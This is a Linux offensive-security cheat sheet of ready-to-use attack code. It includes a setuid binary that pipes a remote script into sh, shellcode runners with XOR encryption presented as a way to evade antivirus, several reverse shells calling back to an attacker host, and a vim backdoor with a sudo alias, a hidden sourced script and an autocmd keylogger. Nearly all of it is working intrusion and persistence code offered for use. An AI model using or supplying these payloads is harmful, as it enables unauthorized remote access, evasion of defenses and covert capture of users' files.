# Linux

### Binary Stage Zero

```c
#include<stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  setuid(0);
  setgid(0);
	system("curl <ip>/run.txt|sh");	
	return 0;
}
```

### Shellcode Runner

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = "..."

int main (int argc, char **argv) {
    int (*ret)() = (int(*)())buf;
    ret();
}
```

Compile with `gcc -o sc sc.c -z execstack` . It might be useful to add some shellcode encryption to bypass AV \(caesar, xor, aes,..\).

#### Encrypt

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = "..."

int main (int argc, char **argv) {
    char key = 'X';
    int len = (int) sizeof(buf);
    for (int i=0; i<len ; i++) {
        printf("\\x%02X",buf[i]^key);
    }
    return 0;
}
```

#### Encrypted Runner

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char buf[] = "..."

int main (int argc, char **argv) {
    char key = 'X';
    int len = (int) sizeof(buf);
    for (int i=0; i<len-1 ; i++) {
        buf[i] = buf[i]^key;    
    }
    int (*ret)() = (int(*)())buf;
    ret();
}
```

### Shell nc reverse

```text
touch /tmp/x; rm /tmp/x; mkfifo /tmp/x; cat /tmp/x | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/x
```

### Shell curl reverse

```text
 curl -sNkT . http://$LHOST:$LPORT </dev/fd/3| sh 3>&-;} 3>&1|:
```

### Shell shell.now.sh

```text
# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://shell.now.sh/yourip:1337 | sh
#
# 3. Don't be a dick
 
if command -v python > /dev/null 2>&1; then
  python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.9.0.194",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
  exit;
fi
 
if command -v perl > /dev/null 2>&1; then
  perl -e 'use Socket;$i="10.9.0.194";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  exit;
fi
 
if command -v nc > /dev/null 2>&1; then
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.194 443 >/tmp/f
  exit;
fi
 
if command -v sh > /dev/null 2>&1; then
  /bin/sh -i >& /dev/tcp/10.9.0.194/443 0>&1
  exit;
fi
```

### VIM Backdoor

To run vim with the user environment when sudo is used, we can add an alias to .bashrc:

```text
alias sudo="sudo -E"
```

#### Silently source custom script \(add to .vimrc\)

```text
:silent !source ~/.notabackdoor
```

#### Add Keylogger

Create vim plugin in ~/.vim/plugins:

```text
:autocmd BufWritePost * :silent :w! >> /dev/shm/keylog.txt
```

Alternatively if you want to only log files edited by root:

```text
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /dev/shm/keylog.txt
:endif
```



